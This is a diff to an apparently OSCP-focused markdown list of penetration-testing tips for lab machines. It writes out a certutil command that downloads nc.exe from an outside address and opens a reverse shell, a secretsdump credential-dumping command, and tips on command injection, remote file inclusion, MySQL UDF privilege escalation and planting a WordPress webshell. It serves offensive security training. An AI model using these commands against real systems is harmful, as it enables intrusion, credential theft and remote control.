@@ -81,7 +81,7 @@ Here is the reformatted content with each point preceded by a dash and placed on
 - Dumping secrets is mainstream knowledge, stop slackin' (C:\windows.old\windows\system32\SAM & SYSTEM>) -> "/usr/local/bin/secretsdump.py -sam SAM -system SYSTEM LOCAL".
 - If you can see that your shell is not maintaining, try modifying the exploit code to suit your needs. In this case, I downloaded and ran nc.exe. "certutil.exe -urlcache -split -f http://192.168.45.195:443/nc.exe C:\Windows\Tasks\nc.exe & C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.195 80" instead of typing the command as a parameter to the exploit.
 - For any weird port, search up related exploit along with any fingerprint that you have to narrow down results.
-- If there's a weird port, such as cgms 3003, try to connect to it and get the version "nc -zv $IP -> help -> version -> search exploit". If this makes no sense you can also refer to "https://github.com/xsudoxx/OSCP".
+- If there's a weird port, such as cgms 3003, try to connect to it and get the version "nc -zv $ip -> help -> version -> search exploit". If this makes no sense you can also refer to "https://github.com/xsudoxx/OSCP".
 - Always search for exploits using terms as vague as possible, then narrow down afterwards, this way you don't miss something.
 - If you have problems compiling an exploit on a target, try doing it on your local computer.
 - If you're POSTing data for a website, try to modify the route. In this case, an exploit relied on htmLawed.php for the exploit to work, and when it tried to post there, it noticed that there was no file with this name. When I modified the route to '/', it worked.
@@ -110,6 +110,26 @@ Here is the reformatted content with each point preceded by a dash and placed on
 - jaws will tell you the firewall rules, use revshells accordingly, ex: "Outbound-tcp 8080,80,88,135,139,445,53,389"
 - If you don't know what a port is, google "port {port} exploit"
 - When replacing a binary, make sure to transfer it directly to the location that it needs to be (or the same directory), that way it keeps the Administrator ownership
+- Whenever you run into a functionality on a website such as a nslookup or ping or anything that could executing a bash/pwsh command, try to add "&&" or ";" and append your own command. It's worth pinging yourself first or wget/certutiling a file from your server first to see if you get a connection
+- If hashcat gives back some sort of Hex Encoding you can use cyber chef to finish off the hash and give you back the password
+- If you crack a password for a zip file, keepass or something, try that with any other users in the environment
+- If MySQL is running as root, try the raptor_udf.c privesc code
+- If you have JWT, crack the secret of the token and modify the key in jwt.io with admin username and secret. Check for SSTI in place of username and or secret, example templates in HackTricks.
+- Understand the running processes, maybe you need to do something that trigger that process that you can run to elevate your privileges, such as send an email to trigger disclaimer process.
+- For Windows directory traversal, see if system is running ssh and target potential users.
+- Smtp-user-enum to check for valid usernames.
+- If something takes parameters, see what happens if you put an illegal parameter.. you’ll often get more information.
+- New nc can’t you -e flag for reverse, but nc.traditional can. If you see something running on local server, curl it.
+- Check out phpinfo for potential users
+- If you find a directory traversal vulnerability in the format of '?page=', try inserting a url to your own server with an exploit. I got this hint by looking in "..\..\..\..\..\..\..\xampp/apache/logs/access.log" and seeing the person setting up the lab test this with their own exploit.
+- If you run into a "Cannot "GET" /dir ", try doing a "POST" instead:, "curl -X POST http://192.168.179.99:33333/list-running-procs -H 'Content-Length: 0'"
+- If a password looks weird and it doesn't work, it may be base64
+- Whenever you get some evidence, it's pretty fucking likely that it's important.. find a way where it could apply.. what are you not seeing ?
+- Search "confluence 7.13.6 exploit github" format for finding poc's.. blogs are great too if you've exhausted your options.. after that, consider manually modifying exploits
+- If you're stuck, you have some information about a webapp or wordpress and you can't find it with gobuster, try checking out the same of the box/webapp manually as a directory
+- For Wordpress, you can upload malicious plugin or simply edit an existing page (theme editor) and insert a webshell
+
+
 
 
 
